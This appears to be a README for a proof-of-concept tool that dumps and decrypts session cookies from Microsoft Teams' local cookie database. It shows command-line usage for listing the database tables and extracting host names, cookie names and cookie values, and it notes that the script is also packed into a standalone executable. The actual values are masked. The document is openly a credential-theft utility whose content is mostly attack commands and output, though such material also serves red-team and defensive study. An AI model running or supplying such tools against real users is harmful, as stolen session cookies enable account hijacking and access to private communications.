## PoC for dumping and decrypting cookies in the latest version of Microsoft Teams

> extract.py just dumps without arguments

> extract.exe is just extract.py packed into an exe

### teams_dump.py 

List values in the database
```
python.exe .\teams_dump.py teams --list

Table: meta
Columns in meta: key, value
--------------------------------------------------
Table: cookies
Columns in cookies: creation_utc, host_key, top_frame_site_key, name, value, encrypted_value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_scheme, source_port, is_same_party
```

Dump the database into a json file
```
python.exe .\teams_dump.py teams --get
[+] Host: teams.microsoft.com
[+] Cookie Name MUIDB
[+] Cookie Value: xxxxxxxxxxxxxx
 **************************************************
[+] Host: teams.microsoft.com
[+] Cookie Name TSREGIONCOOKIE
[+] Cookie Value: xxxxxxxxxxxxxx
 **************************************************
```
